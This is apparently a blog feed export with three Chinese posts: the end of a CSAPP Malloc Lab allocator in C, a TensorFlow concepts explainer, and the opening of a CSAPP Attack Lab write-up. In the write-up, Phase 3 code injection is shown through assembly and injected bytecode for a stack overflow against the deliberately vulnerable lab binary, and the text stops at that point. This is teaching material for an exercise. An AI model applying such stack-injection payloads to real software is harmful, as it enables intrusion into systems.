class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="comment">/* $end mmfree */</span></span><br><span class="line">    <span class="keyword">if</span> (heap_listp == <span class="number">0</span>)&#123;</span><br><span class="line">        mm_init();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $begin mmfree */</span></span><br><span class="line"></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(bp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* $end mmfree */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * coalesce - Boundary tag coalescing. Return ptr to coalesced block</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmfree */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;            <span class="comment">/* Case 1 */</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;      <span class="comment">/* Case 2 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size,<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;      <span class="comment">/* Case 3 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;                                     <span class="comment">/* Case 4 */</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +</span><br><span class="line">                GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $end mmfree */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line">    <span class="comment">/* Make sure the rover isn't pointing into the free block */</span></span><br><span class="line">    <span class="comment">/* that we just coalesced */</span></span><br><span class="line">    <span class="keyword">if</span> ((rover &gt; (<span class="keyword">char</span> *)bp) &amp;&amp; (rover &lt; NEXT_BLKP(bp)))</span><br><span class="line">        rover = bp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* $begin mmfree */</span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmfree */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Naive implementation of realloc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If size == 0 then this is just free, and we return NULL. */</span></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) &#123;</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If oldptr is NULL, then this is just malloc. */</span></span><br><span class="line">    <span class="keyword">if</span>(ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If realloc() fails the original block is left untouched  */</span></span><br><span class="line">    <span class="keyword">if</span>(!newptr) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy the old data. */</span></span><br><span class="line">    oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span>(size &lt; oldsize) oldsize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free the old block. */</span></span><br><span class="line">    mm_free(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_checkheap - Check the heap for correctness</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_checkheap</span><span class="params">(<span class="keyword">int</span> verbose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    checkheap(verbose);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The remaining routines are internal helper routines</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * extend_heap - Extend heap with free block and return its block pointer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmextendheap */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words+<span class="number">1</span>) * WSIZE : words * WSIZE; <span class="comment">//line:vm:mm:beginextend</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;                                        <span class="comment">//line:vm:mm:endextend</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize free block header/footer and the epilogue header */</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));         <span class="comment">/* Free block header */</span>   <span class="comment">//line:vm:mm:freeblockhdr</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));         <span class="comment">/* Free block footer */</span>   <span class="comment">//line:vm:mm:freeblockftr</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>)); <span class="comment">/* New epilogue header */</span> <span class="comment">//line:vm:mm:newepihdr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Coalesce if the previous block was free */</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);                                          <span class="comment">//line:vm:mm:returnblock</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmextendheap */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * place - Place block of asize bytes at start of free block bp</span></span><br><span class="line"><span class="comment"> *         and split if remainder would be at least minimum block size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmplace */</span></span><br><span class="line"><span class="comment">/* $begin mmplace-proto */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* $end mmplace-proto */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= (<span class="number">2</span>*DSIZE)) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize-asize, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmplace */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * find_fit - Find a fit for a block with asize bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* $begin mmfirstfit */</span></span><br><span class="line"><span class="comment">/* $begin mmfirstfit-proto */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* $end mmfirstfit-proto */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $end mmfirstfit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NEXT_FIT</span></span><br><span class="line">    <span class="comment">/* Next fit search */</span></span><br><span class="line">    <span class="keyword">char</span> *oldrover = rover;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search from the rover to the end of list */</span></span><br><span class="line">    <span class="keyword">for</span> ( ; GET_SIZE(HDRP(rover)) &gt; <span class="number">0</span>; rover = NEXT_BLKP(rover))</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(rover)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(rover))))</span><br><span class="line">            <span class="keyword">return</span> rover;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* search from start of list to old rover */</span></span><br><span class="line">    <span class="keyword">for</span> (rover = heap_listp; rover &lt; oldrover; rover = NEXT_BLKP(rover))</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(rover)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(rover))))</span><br><span class="line">            <span class="keyword">return</span> rover;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">/* no fit found */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* $begin mmfirstfit */</span></span><br><span class="line">    <span class="comment">/* First-fit search */</span></span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">/* No fit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmfirstfit */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> hsize, halloc, fsize, falloc;</span><br><span class="line"></span><br><span class="line">    checkheap(<span class="number">0</span>);</span><br><span class="line">    hsize = GET_SIZE(HDRP(bp));</span><br><span class="line">    halloc = GET_ALLOC(HDRP(bp));</span><br><span class="line">    fsize = GET_SIZE(FTRP(bp));</span><br><span class="line">    falloc = GET_ALLOC(FTRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hsize == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%p: EOL\n"</span>, bp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: header: [%ld:%c] footer: [%ld:%c]\n"</span>, bp,</span><br><span class="line">           hsize, (halloc ? <span class="string">'a'</span> : <span class="string">'f'</span>),</span><br><span class="line">           fsize, (falloc ? <span class="string">'a'</span> : <span class="string">'f'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)bp % <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Error: %p is not doubleword aligned\n"</span>, bp);</span><br><span class="line">    <span class="keyword">if</span> (GET(HDRP(bp)) != GET(FTRP(bp)))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Error: header does not match footer\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * checkheap - Minimal check of the heap for consistency</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkheap</span><span class="params">(<span class="keyword">int</span> verbose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp = heap_listp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Heap (%p):\n"</span>, heap_listp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((GET_SIZE(HDRP(heap_listp)) != DSIZE) || !GET_ALLOC(HDRP(heap_listp)))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bad prologue header\n"</span>);</span><br><span class="line">    checkblock(heap_listp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (verbose)</span><br><span class="line">            printblock(bp);</span><br><span class="line">        checkblock(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (verbose)</span><br><span class="line">        printblock(bp);</span><br><span class="line">    <span class="keyword">if</span> ((GET_SIZE(HDRP(bp)) != <span class="number">0</span>) || !(GET_ALLOC(HDRP(bp))))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bad epilogue header\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> CSAPP Lab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2 TF核心概念]]></title>
      <url>/wiki/2017/12/30/TensorFlow-2-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/</url>
      <content type="html"><![CDATA[<p>TF的核心是围绕Graph展开的，简而言之，就是Tensor沿着Graph传递闭包完成Flow的过程。所以在介绍Graph之前需要讲述一下符号编程、计算流图、梯度计算、控制流的概念。</p>
<h2 id="2-1-Tensor"><a href="#2-1-Tensor" class="headerlink" title="2.1 Tensor"></a>2.1 Tensor</h2><p>在数学上，Matrix表示二维线性映射，Tensor表示多维线性映射，Tensor是对Matrix的泛化，可以表示1-dim、2-dim、N-dim的高维空间。图4对比了矩阵乘法（Matrix Product）和张量积（Tensor Contract），可以看出Tensor的泛化能力，其中张量积运算在TF的MatMul和Conv2D运算中都有用到。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148901398907.jpg" alt=""></p>
<p>Tensor在高维空间数学运算比Matrix计算复杂，计算量也非常大，加速张量并行运算是TF优先考虑的问题，如<code>add</code>, <code>contract</code>, <code>slice</code>, <code>reshape</code>, <code>reduce</code>, <code>shuffle</code>等运算。</p>
<p>TF中Tensor的维数描述为阶，数值是0阶，向量是1阶，矩阵是2阶，以此类推，可以表示n阶高维数据。</p>
<p>TF中Tensor支持的数据类型有很多，如<code>tf.float16</code>, <code>tf.float32</code>, <code>tf.float64</code>, <code>tf.uint8</code>, <code>tf.int8</code>, <code>tf.int16</code>, <code>tf.int32</code>, <code>tf.int64</code>, <code>tf.string</code>, <code>tf.bool</code>, <code>tf.complex64</code>等，所有Tensor运算都使用泛化的数据类型表示。</p>
<p>TF的Tensor定义和运算主要是调用<code>Eigen</code>矩阵计算库完成的。TF中Tensor的UML定义如图4。其中TensorBuffer指针指向Eigen::Tensor类型。其中，Eigen::Tensor[5][6]不属于Eigen官方维护的程序，由贡献者提供文档和维护，所以Tensor定义在Eigen unsupported模块中。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148901576555.jpg" alt=""></p>
<p>图2-2中，Tensor主要包含两个变量<code>m_data</code>和<code>m_dimension</code>，m_data保存了Tensor的数据块，T是泛化的数据类型，m_dimensions保存了Tensor的维度信息。</p>
<p><code>Eigen:Tensor</code>的成员变量很简单，却支持非常多的基本运算，再借助<code>`的加速机制实现快速计算，参考章节3.2。</code>Eigen::Tensor`主要包含了</p>
<ul>
<li><p>一元运算（Unary），如<code>sqrt</code>、<code>square</code>、<code>exp</code>、<code>abs</code>等。</p>
</li>
<li><p>二元运算（Binary），如<code>add</code>，<code>sub</code>，<code>mul</code>，<code>div</code>等</p>
</li>
<li><p>选择运算（Selection），即<code>if/else</code>条件运算</p>
</li>
<li><p>归纳运算（Reduce），如<code>reduce_sum</code>， <code>reduce_mean</code>等</p>
</li>
<li><p>几何运算（Geometry），如reshape，slice，shuffle，chip，reverse，pad，concatenate，extract_patches，extract_image_patches等</p>
</li>
<li><p>张量积（Contract）和卷积运算（Convolve）是重点运算，后续会详细讲解。</p>
</li>
</ul>
<h2 id="2-2-符号编程"><a href="#2-2-符号编程" class="headerlink" title="2.2 符号编程"></a>2.2 符号编程</h2><p>编程模式通常分为命令式编程（<code>imperative style programs</code>）和符号式编程（<code>symbolic style programs</code>）。</p>
<p>命令式编程容易理解和调试，命令语句基本没有优化，按原有逻辑执行。符号式编程涉及较多的嵌入和优化，不容易理解和调试，但运行速度有同比提升。</p>
<p>这两种编程模式在实际中都有应用，Torch是典型的命令式风格，caffe、theano、mxnet和Tensorflow都使用了符号式编程。其中caffe、mxnet采用了两种编程模式混合的方法，而Tensorflow是完全采用了符号式编程，Theano和Tensorflow的编程模式更相近。</p>
<p>命令式编程是常见的编程模式，编程语言如python/C++都采用命令式编程。命令式编程明确输入变量，并根据程序逻辑逐步运算，这种模式非常在调试程序时进行单步跟踪，分析中间变量。举例来说，设A=10, B=10，计算逻辑：</p>
<p><code>C=A*B 
D=C+1</code></p>
<p>第一步计算得出C=100，第二步计算得出D=101，输出结果D=101。</p>
<p>符号式编程将计算过程抽象为计算图，计算流图可以方便的描述计算过程，所有输入节点、运算节点、输出节点均符号化处理。计算图通过建立输入节点到输出节点的传递闭包，从输入节点出发，沿着传递闭包完成数值计算和数据流动，直到达到输出节点。这个过程经过计算图优化，以数据（计算）流方式完成，节省内存空间使用，计算速度快，但不适合程序调试，通常不用于编程语言中。举上面的例子，先根据计算逻辑编写符号式程序并生成计算图</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148902304762.jpg" alt=""></p>
<p>其中A和B是输入符号变量，C和D是运算符号变量，compile函数生成计算图F，如图2-3所示。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148902358270.jpg" alt=""></p>
<p>最后得到A=10, B=10时变量D的值，这里D可以复用C的内存空间，省去了中间变量的空间存储。</p>
<p>`D=F(A=10, B=10)</p>
<p>图2-4是TF中的计算流图，<code>C=F(Relu(Add(MatMul(W, x), b)))</code>，其中每个节点都是符号化表示的。通过session创建<code>graph</code>，在调用<code>session.run</code>执行计算。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148903182670.jpg" alt=""></p>
<p>和目前的符号语言比起来，TF最大的特点是强化了数据流图，引入了mutation的概念。这一点是TF和包括Theano在内的符号编程框架最大的不同。所谓mutation，就是可以在计算的过程更改一个变量的值，而这个变量在计算的过程中会被带入到下一轮迭代里面去。</p>
<p>Mutation是机器学习优化算法几乎必须要引入的东西（虽然也可以通过immutable replacement来代替，但是会有效率的问题）。 Theano的做法是引入了update statement来处理mutation。TF选择了纯符号计算的路线，并且直接把更新引入了数据流图中去。从目前的白皮书看还会支持条件和循环。这样就几乎让TF本身成为一门独立的语言。不过这一点会导致最后的API设计和使用需要特别小心，把mutation 引入到数据流图中会带来一些新的问题，比如如何处理写与写之间的依赖。</p>
<h2 id="2-3-梯度计算"><a href="#2-3-梯度计算" class="headerlink" title="2.3 梯度计算"></a>2.3 梯度计算</h2><p>梯度计算主要应用在误差反向传播和数据更新，是深度学习平台要解决的核心问题。梯度计算涉及每个计算节点，每个自定义的前向计算图都包含一个隐式的反向计算图。从数据流向上看，正向计算图是数据从输入节点到输出节点的流向过程，反向计算图是数据从输出节点到输入节点的流向过程。</p>
<p>图2-5是2.2节中图2-3对应的反向计算图。图中，由于C=A<em>B，则dA=B</em>dC, dB=A<em>dC。在反向计算图中，输入节点dD，输出节点dA和dB，计算表达式为dA=B</em>dC=B<em>dD, dB=A</em>dC=A*dD。每一个正向计算节点对应一个隐式梯度计算节点。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148903540237.jpg" alt=""></p>
<p>反向计算限制了符号编程中内存空间复用的优势，因为在正向计算中的计算数据在反向计算中也可能要用到。从这一点上讲，粗粒度的计算节点比细粒度的计算节点更有优势，而TF大部分为细粒度操作，虽然灵活性很强，但细粒度操作涉及到更多的优化方案，在工程实现上开销较大，不及粗粒度简单直接。在神经网络模型中，TF将逐步侧重粗粒度运算。</p>
<h2 id="2-4-控制流"><a href="#2-4-控制流" class="headerlink" title="2.4 控制流"></a>2.4 控制流</h2><p>TF的计算图如同数据流一样，数据流向表示计算过程，如图2-6。数据流图可以很好的表达计算过程，为了扩展TF的表达能力，TF中引入控制流。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148903655516.jpg" alt=""></p>
<p>图2-6 Graph的数据流</p>
<p>在编程语言中，if…else…是最常见的逻辑控制，在TF的数据流中也可以通过这种方式控制数据流向。接口函数如下，pred为判别表达式，fn1和fn2为运算表达式。当pred为true是，执行fn1操作；当pred为false时，执行fn2操作。</p>
<p><code>tf.cond(pred, fn1, fn2, name=None)</code></p>
<p>TF还可以协调多个数据流，在存在依赖节点的场景下非常有用，例如节点B要读取模型参数θ更新后的值，而节点A负责更新参数θ，则节点B必须等节点A完成后才能执行，否则读取的参数θ为更新前的数值，这时需要一个运算控制器。接口函数如下，<code>tf.control_dependencies</code>函数可以控制多个数据流执行完成后才能执行接下来的操作，通常与<code>tf.group</code>函数结合使用。</p>
<p><code>tf.control_dependencies(control_inputs)</code></p>
<p>TF支持的控制算子有Switch、Merge、Enter、Leave和NextIteration等。</p>
<p>TF不仅支持逻辑控制，还支持循环控制。TF使用和MIT Token-Tagged machine相似的表示系统，将循环的每次迭代标记为一个tag，迭代的执行状态标记为一个frame，但迭代所需的数据准备好的时候，就可以开始计算，从而多个迭代可以同时执行。</p>
]]></content>
      
        <categories>
            
            <category> TensorFlow </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tensorflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Lab3 Attack Lab]]></title>
      <url>/wiki/2017/12/30/CSAPP-Lab-Attack-Lab/</url>
      <content type="html"><![CDATA[<p>CMU 15-213 Lab3 Attack Lab</p>
<ul>
<li><a href="http://csapp.cs.cmu.edu/3e/labs.html">Lab 下载地址</a></li>
<li><a href="https://scs.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=60c65748-2026-463f-8c57-134fd6661cdf">Recitation讲解</a></li>
</ul>
<h2 id="Phase3"><a href="#Phase3" class="headerlink" title="Phase3"></a>Phase3</h2><p>Phase3的任务是调用<code>touch3</code>函数，并传入cookie字符串。所涉及的函数的代码是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>touch3</code>函数会调用函数<code>hexmatch</code>进行，对比传入的<code>sval</code>字符串(也就是我们要传入的cookie)是否和程序内部的cookie一致。所以我们应该大致清楚attack的步骤：</p>
<ul>
<li>传入参数<code>sval</code>到<code>touch3</code>, 由于<code>sval</code>是字符串指针，所以我们要在%rdi(Arg1 寄存器)中放入字符串的地址。</li>
<li>把字符串放在栈中，但是要防止函数调用时将其覆盖。</li>
<li>设置<code>touch3</code>函数的地址为返回值地址。</li>
</ul>
<p>这题稍微有些复杂，我们一步一步来，先把cookie(0x59b997fa) 转换成字符串的表达形式，也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa-&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>在Linux下，可用<code>man ascii</code>查找字符所对应的ascii码。</p>
<p>然后构造注入代码，<code>touch3</code>的地址为0x4018fa, 根据phase2我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28, 字符串存放的地址应为%rsp+0x30.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#phase3.s</span><br><span class="line">movq $0x5561dc98,%rdi                                                                                                   </span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c phase3.s</span><br><span class="line">$ objdump -d phase3.o &gt; phase3.d</span><br></pre></td></tr></table></figure>
<p>得到字节码<code>48 c7 c7 98 dc 61 55 68 fa 18 40 00 c3</code>:</p>
